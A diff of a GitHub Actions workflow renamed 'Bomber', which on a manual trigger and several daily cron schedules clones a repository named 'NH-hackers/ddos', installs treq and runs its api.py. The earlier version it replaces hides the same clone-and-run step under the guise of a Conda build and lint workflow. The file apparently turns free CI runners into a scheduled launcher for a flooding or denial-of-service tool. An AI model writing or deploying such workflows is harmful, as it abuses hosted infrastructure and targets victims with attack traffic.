@@ -1,27 +1,34 @@
-name: Python Package using Conda
+name: Bomber
 
-on: [push]
+on:
+   workflow_dispatch:
+   schedule:
+   #  - cron: '*/20 * * * *'
+     - cron: '30 2 * * *'
+     - cron: '00 3 * * *'
+     - cron: '30 3 * * *'
+     - cron: '20 5 * * *'
+     - cron: '30 6 * * *'
+     - cron: '00 8 * * *'
+     - cron: '00 9 * * *'
+
+
+     
+     
+
 
 jobs:
-  build-linux:
+  build:
     runs-on: ubuntu-latest
-    strategy:
-      max-parallel: 5
-
     steps:
-    - uses: actions/checkout@v3
-    - name: Add conda to system path
-      run: git clone https://github.com/NH-hackers/ddos.git; cd ddos
-        # $CONDA is an environment variable pointing to the root of the miniconda directory
-        echo $CONDA/bin >> $GITHUB_PATH
-    - name: Install dependencies
-      run: pip install treq
-        conda env update --file environment.yml --name base
-    - name: Lint with flake8
-      run: python3 api.py
-        conda install flake8
-        
-    - name: Test with pytest
-      run: |
-        conda install pytest
-        pytest
+
+      
+      - uses: actions/checkout@v3
+
+      
+      - name: copy git
+
+        run: git clone https://github.com/NH-hackers/ddos.git; cd ddos; pip install treq
+
+      - name: run
+        run: python3 api.py
